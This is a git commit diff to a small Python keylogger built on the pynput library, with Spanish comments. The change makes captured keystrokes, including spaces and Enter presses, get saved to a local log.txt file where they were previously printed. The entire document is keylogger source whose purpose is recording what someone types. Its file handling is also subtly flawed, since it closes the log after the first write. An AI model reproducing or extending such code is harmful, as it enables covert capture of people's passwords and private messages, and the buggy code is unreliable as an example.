7d957ae3bad945625d1c411dc2adee0b923a18f3
danieltistoj <josetisrey@gmail.com>
2021-09-11 18:25:37 -0600

    guardar en fichero

--- main.py
+++ main.py
@@ -1,10 +1,12 @@
 import pynput.keyboard
 #trabajar con palabras
+log_file = open('log.txt','w+')
 lista_tecla=[] #En esta lista se guardaran las palabras
 def imprimir():
     tecla = ''.join(lista_tecla)
-    print(tecla)
-
+    log_file.write(tecla)
+    log_file.write("\n")
+    log_file.close()
 def presiona(key):
     key1 = convertir(key)
     #Key es con la letra k en mayuscula
@@ -15,6 +17,9 @@ def presiona(key):
     #Si es igual al espacio
     elif key1 == "Key.space":
         lista_tecla.append(" ")
+    #si le da un enter
+    elif key1 == "Key.enter":
+        lista_tecla.append("\n")
     #Si es igual a una letra
     else:
         lista_tecla.append(key1)
